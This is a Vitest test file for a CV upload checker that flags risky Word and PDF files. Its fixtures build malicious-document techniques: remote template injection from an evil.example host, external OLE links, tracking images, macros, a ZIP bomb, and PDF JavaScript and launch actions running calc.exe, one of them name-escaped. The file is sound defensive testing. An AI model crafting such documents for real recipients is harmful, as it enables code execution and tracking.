import { describe, expect, it } from "vitest";
import { cvWarnings, isWordPackage } from "@/lib/careers/cv-check";
import { zip } from "./fixtures";

const R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
const rels = (...items: string[]) =>
  `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${items.join("")}</Relationships>`;
const rel = (type: string, target: string, external = true) =>
  `<Relationship Id="r${Math.random().toString(36).slice(2)}" Type="${R}/${type}" Target="${target}"${external ? ' TargetMode="External"' : ""}/>`;

const docx = (extra: Record<string, string | Buffer> = {}, documentRels = rels(rel("styles", "styles.xml", false))) =>
  zip({ "[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document/>", "word/_rels/document.xml.rels": documentRels, ...extra });

describe("cvWarnings, Word", () => {
  it("passes an ordinary CV, hyperlinks included", () => {
    expect(cvWarnings(docx(), "docx")).toEqual([]);
    expect(cvWarnings(docx({}, rels(rel("hyperlink", "https://www.linkedin.com/in/alice"))), "docx")).toEqual([]);
  });

  it("flags a remote template, document, object or image", () => {
    const settings = { "word/_rels/settings.xml.rels": rels(rel("attachedTemplate", "https://evil.example/t.dotm")) };
    expect(cvWarnings(docx(settings), "docx")).toEqual(["loads a template from the internet when opened"]);
    expect(cvWarnings(docx({}, rels(rel("subDocument", "https://evil.example/d.docx"))), "docx")).toEqual([
      "pulls in another document from the internet",
    ]);
    expect(cvWarnings(docx({}, rels(rel("oleObject", "file://evil/x"))), "docx")).toEqual(["links to an object outside the file"]);
    expect(cvWarnings(docx({}, rels(rel("image", "https://tracker.example/p.png"))), "docx")[0]).toMatch(/loads images from the internet/);
  });

  it("ignores the same types when they point inside the file", () => {
    expect(cvWarnings(docx({}, rels(rel("image", "media/photo.png", false))), "docx")).toEqual([]);
  });

  it("flags macros and embedded files", () => {
    expect(cvWarnings(docx({ "word/vbaProject.bin": "x" }), "docx")).toEqual(["contains macros"]);
    expect(cvWarnings(docx({ "word/embeddings/oleObject1.bin": "x" }), "docx")).toEqual(["has files or objects embedded in it"]);
  });

  it("reads stored (uncompressed) parts too", () => {
    const stored = zip({ "word/_rels/settings.xml.rels": rels(rel("attachedTemplate", "https://evil.example/t.dotm")) }, 0);
    expect(cvWarnings(stored, "docx")).toEqual(["loads a template from the internet when opened"]);
  });

  it("doesn't unpack a part that inflates past 1 MB (a ZIP bomb)", () => {
    const bomb = docx({ "word/_rels/huge.xml.rels": " ".repeat(2 * 1024 * 1024) });
    expect(bomb.length).toBeLessThan(10_000);
    expect(cvWarnings(bomb, "docx")).toEqual(["could not be fully checked"]);
  });

  it("flags a file that starts like a ZIP but isn't one", () => {
    expect(cvWarnings(Buffer.from("PK\x03\x04 not really a zip"), "docx")).toEqual(["isn't a readable Word file"]);
    const truncated = docx();
    expect(cvWarnings(truncated.subarray(0, truncated.length - 30), "docx")).toEqual(["isn't a readable Word file"]);
  });
});

describe("cvWarnings, PDF", () => {
  const pdf = (body: string) => Buffer.from(`%PDF-1.7\n1 0 obj\n<< ${body} >>\nendobj\n%%EOF`, "latin1");

  it("passes an ordinary PDF, links and JSON-like names included", () => {
    expect(cvWarnings(pdf("/Type /Catalog /URI (https://www.linkedin.com/in/alice) /JSONData 1"), "pdf")).toEqual([]);
  });

  it("flags JavaScript, launch actions, embedded files and rich media", () => {
    expect(cvWarnings(pdf("/OpenAction << /S /JavaScript /JS (app.alert(1)) >>"), "pdf")).toEqual(["contains JavaScript"]);
    expect(cvWarnings(pdf("/S /Launch /F (calc.exe)"), "pdf")).toEqual(["can try to launch a program"]);
    expect(cvWarnings(pdf("/Names << /EmbeddedFiles 2 0 R >>"), "pdf")).toEqual(["has files embedded in it"]);
    expect(cvWarnings(pdf("/AcroForm << /XFA 3 0 R >>"), "pdf")).toEqual(["has interactive content (Flash or an XFA form)"]);
  });

  it("sees through #xx escapes in names", () => {
    expect(cvWarnings(pdf("/S /J#61vaScript"), "pdf")).toEqual(["contains JavaScript"]);
  });
});

describe("isWordPackage", () => {
  it("accepts a Word document", () => {
    expect(isWordPackage(docx())).toBe(true);
  });

  it("refuses any other kind of ZIP", () => {
    expect(isWordPackage(zip({ "photo.jpg": "x", "notes.txt": "y" }))).toBe(false);
    expect(isWordPackage(zip({ "[Content_Types].xml": "<Types/>", "xl/workbook.xml": "<workbook/>" }))).toBe(false);
  });

  it("can't tell when the ZIP directory is unreadable, so the caller keeps the file with a warning", () => {
    expect(isWordPackage(Buffer.from("PK\x03\x04 not really a zip"))).toBeNull();
    const truncated = docx();
    expect(isWordPackage(truncated.subarray(0, truncated.length - 30))).toBeNull();
  });
});
